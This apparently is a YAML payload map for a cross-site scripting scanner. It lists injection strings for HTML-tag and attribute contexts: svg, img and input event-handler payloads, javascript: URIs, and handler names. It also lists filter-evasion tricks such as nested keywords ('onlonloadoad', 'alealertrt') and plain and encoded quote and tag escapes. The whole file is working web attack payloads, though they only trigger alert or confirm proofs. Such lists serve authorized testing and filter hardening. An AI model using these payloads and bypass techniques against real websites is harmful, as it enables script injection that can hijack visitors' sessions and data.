---
# Payload map for HTML Context
"svg":
  "onlonloadoad":
    payloads:
      - "<svg/onlonloadoad=oad=alealertrt()>"
  "onlonloadoad=oad":
    payloads:
      - "<svg/onlonloadoad=oad=alealertrt()>"
  "onload":
    payloads:
      - "<svg onload=alert()>"
      - "<svg/onload=alert()>"
"img":
  "onload":
    payloads:
      - "<img onload=alert()>"
      - "<img/onload=alert()>"
  "onerror":
    payloads:
      - "<img src=x onerror=alert()>"
"input":
  "autofocus":
    payloads:
      - "<input autofocus=\"\" onfocus=alert()>"
...
---
# Payloads for attribute context
"href":
  - "javascript:alert()"
  - "javascrscriptipt:alealertrt()"
  - "javascrjavascriptipt:alealertrt()"
  - "alert()"
"handlers":
  - "onmouseover"
  - "onmousewheel"
  - "onmouseup"
  - "onmousedown"
  - "onload"
  - "onpageshow"
  - "onscroll"
"actions":
  - "alert()"
  - "confirm()"
  - "confirm``"
  - "alealertrt()"
  - "alert``"
  - "alealert``"
"escapeAttr":
  - "'"
  - "\'"
  - "\\\'"
  - "\""
  - "\\\""
  - "\\\\\""
"escapeTag":
  - ">"
  - "\\>"
  - "%3e"
  - "%25%33%65"
---
